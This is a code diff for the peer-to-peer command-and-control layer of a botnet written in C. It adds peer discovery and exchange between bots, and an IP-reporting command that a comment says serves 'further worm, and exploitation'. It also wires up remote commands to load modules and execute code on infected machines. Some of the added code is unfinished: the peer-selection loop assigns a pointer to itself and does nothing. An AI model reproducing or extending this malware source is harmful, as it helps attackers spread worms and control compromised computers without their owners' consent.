@@ -43,6 +43,10 @@ ip generate seed can be used to ensure different bots scan different IPs
 // how many old hashes to store for broadcasts?
 // will start at 64.. 16-20 is prob max ever required for millions
 #define MAX_HASH_COUNT 64
+// minimum seconds in between peer requests
+#define PEER_REQ_MIN_TS 300
+// how many peers to give after a request?
+#define PEER_REQ_COUNT 15
 
 uint32_t security_token = 0;
 
@@ -55,6 +59,24 @@ enum {
     BOT_KEY_EXCHANGE=4096,
     BOT_PERFECT=STATE_OK
 };
+
+
+
+enum {
+    BOT_CMD_PING,
+    BOT_CMD_PONG,
+    BOT_CMD_BROADCAST,
+    BOT_CMD_LOADMODULE,
+    BOT_CMD_UNLOADMODULE,
+    BOT_CMD_EXECUTE,
+    BOT_CMD_CONTROL_MODULE,
+    BOT_CMD_REPORT_IP,
+    BOT_CMD_WANT_PEERS,
+    BOT_CMD_PEER_INFO
+};
+
+
+
 /*
 typedef struct _botlink_channel {
     struct _botlink_channel *next;
@@ -121,6 +143,13 @@ typedef struct _bot_variables {
     // this uses more memory.. ill test both and choose one
     int broadcast_i;
     uint32_t broadcast_hashlist[MAX_HASH_COUNT];
+    
+    // how many times has this bot requested peers?
+    // so a bot cannot dump all peers easily..
+    int req_peer_count;
+    // and how long ago?
+    int req_peer_ts;
+    int ask_peer_ts;
 } BotVariables;
 
 
@@ -212,6 +241,8 @@ int botlink_init(Modules **_module_list) {
 int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
     int cur_ts = time(0);
     int i = 0;
+    int node_count = 0;
+    BotVariables *vars = NULL;
     // handle tcp/ip for each connection
     // will flush outgoing queue, and fill incoming
     
@@ -222,6 +253,20 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
         // attempt to connect to however many nodes we are mising under X connections
         // reuse bitcoin connect nodes..
         bitcoin_connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
+        
+        node_count = L_count((LIST *)mptr->node_list);
+        
+        if (node_count < MIN_BOT_CONNECTIONS) {
+            for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
+                vars = BotVars(cptr);
+                if (vars == NULL) continue;
+                if ((cur_ts - vars->ask_peer_ts) > PEER_REQ_MIN_TS) {
+                    // ask this peer for new nodes..
+                    bot_pushcmd(mptr, cptr, BOT_CMD_WANT_PEERS, NULL, 0);
+                }
+            }
+        }
+        
     } 
     
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
@@ -425,7 +470,8 @@ int bot_pushcmd(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, i
     // cryptographically sign/authorize the command
     hdr->authorization = bot_cmdauthorize(mptr, cptr, cmd, pkt, pktsize);
     // copy packet behind header
-    memcpy(buf + sizeof(CMDHdr), pkt, pktsize);
+    if (pkt != NULL && pktsize)
+        memcpy(buf + sizeof(CMDHdr), pkt, pktsize);
 
     // send over to the main botlink packet command for distribution    
     ret = bot_pushpkt(mptr, cptr, pkt, pktsize);
@@ -563,6 +609,8 @@ int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size) {
     return 1;
 }
 
+
+
 int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
     BotVariables *vars = BotVars(cptr);
     int key_size = 0;
@@ -591,21 +639,12 @@ int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
     // set state to perform a normal connection
     cptr->state = BOT_PERFECT;
     
+    // after key exchange we will provide the opposide side with their IP address
+    // this will be useful for further worm, and exploitation via httpd/etc
+    bot_pushcmd(mptr, cptr, BOT_CMD_REPORT_IP, (char *)&cptr->addr, sizeof(uint32_t));
     return 1;
 }
 
-// bot commands go under here..
-
-
-enum {
-    BOT_CMD_PING,
-    BOT_CMD_PONG,
-    BOT_CMD_BROADCAST,
-    BOT_CMD_LOADMODULE,
-    BOT_CMD_UNLOADMODULE,
-    BOT_CMD_EXECUTE,
-    BOT_CMD_CONTROL_MODULE
-};
 
 // push a ping, or pong to a bot
 int botlink_pingpong(Modules *mptr, Connection *cptr, int pong) {
@@ -617,6 +656,73 @@ int botlink_pingpong(Modules *mptr, Connection *cptr, int pong) {
 // push a pong to the side requesting..
 int botlink_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size) {
     return botlink_pingpong(mptr, cptr, 1);
+}
+
+int botlink_cmd_report_ip(Modules *mptr, Connection *cptr, char *buf, int size) {
+    uint32_t *_ip = (uint32_t *)buf;
+    
+    // set the reported IP in their structure..
+    cptr->reported_addr = *_ip;
+    
+    return 1;
+}
+
+int botlink_give_peer(Modules *mptr, Connection *cptr, Node *nptr) {
+    PeerInfo pinfo;
+    
+    pinfo.addr = nptr->addr;
+    pinfo.port = nptr->port;
+    
+    // push peer to client..
+    bot_pushcmd(mptr, cptr, BOT_CMD_PEER_INFO, (char *)&pinfo, sizeof(PeerInfo));
+    
+    return 1;
+}
+
+int botlink_cmd_want_peers(Modules *mptr, Connection *cptr, char *buf, int size) {
+    BotVariables *vars = BotVars(cptr);
+    int i = 0;
+    Node *nptr = NULL;
+    
+    if (vars->req_peer_count > 5) {
+        ConnectionBad(cptr);
+        return -1;
+    }
+    
+    if ((time(0) - vars->req_peer_ts) < PEER_REQ_MIN_TS) return -1;
+    
+    // find random peers to give to this user 
+    // later we need to sort out important peers.. and give only the newest and maybe somme other
+    // algorithm to decide
+    for (i = 0; i < PEER_REQ_COUNT; i++) {
+        
+        // grab a random node.. and perform logic checks
+        nptr = nptr;
+                
+        if (nptr == NULL) break;
+        
+        // give peer to remote bot..
+        botlink_give_peer(mptr, cptr, nptr);
+    }
+    
+    return 1;
+}
+
+// we got a peer from another bot.. we have to create a node structure around it
+int botlink_cmd_peer_info(Modules *mptr, Connection *cptr, char *buf, int size) {
+    PeerInfo *pinfo = (PeerInfo *)buf;
+    Node *nptr = NULL;
+
+    if ((nptr = (Node *)L_add((LIST **)&mptr->node_list, sizeof(Node))) == NULL) {
+        //oh well if we cannot add it.. let things continue
+        return 1;
+    }
+    
+    // add it from the structure
+    nptr->addr = pinfo->addr;
+    nptr->port = pinfo->port;
+    
+    return 1;    
 }
 
 // this is separate in case a p2p command comes in that has to be parsed correctly
@@ -642,11 +748,14 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
         { BOT_CMD_PONG, NULL, 0, false, false },
         
         // broadcast commands get verified before distribution
-        { BOT_CMD_BROADCAST, &botlink_cmd_broadcast, true, false },
+        { BOT_CMD_BROADCAST, &botlink_cmd_broadcast, 0, true, false },
+        { BOT_CMD_REPORT_IP, &botlink_cmd_report_ip, sizeof(uint32_t), false, false },
+        { BOT_CMD_LOADMODULE, &botlink_cmd_loadmodule, 0, true, false },
+        { BOT_CMD_UNLOADMODULE, &botlink_cmd_unloadmodule, 0, true, false },
+        { BOT_CMD_EXECUTE, &botlink_cmd_execute, 0, true, true },
         
-        { BOT_CMD_LOADMODULE, &botlink_cmd_loadmodule, true, false },
-        { BOT_CMD_UNLOADMODULE, &botlink_cmd_unloadmodule, true, false },
-        { BOT_CMD_EXECUTE, &botlink_cmd_execute, true, true },
+        { BOT_CMD_WANT_PEERS, &botlink_cmd_want_peers, 0, false, false },
+        { BOT_CMD_PEER_INFO, &botlink_cmd_peer_info, sizeof(PeerInfo), false, false },
         //{ BOT_CMD_CONTROL_MODULE, &botlink_cmd_control_module, true, true },
         { 0, NULL }
     };
@@ -722,7 +831,7 @@ int botlink_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) {
     // bptr already starts at the list.. now iterate through it
     while (bptr != NULL) {
         // if state is OK then its connected
-        if (bptr->state == BOT_PERFECT) {
+        if (stateOK(bptr)) {
             // if its not a duplicate of a prior message recently distributed
             if (Broadcast_DupeCheck(mptr, cptr, buf, size)) {
                 // push broadcast command w the packet
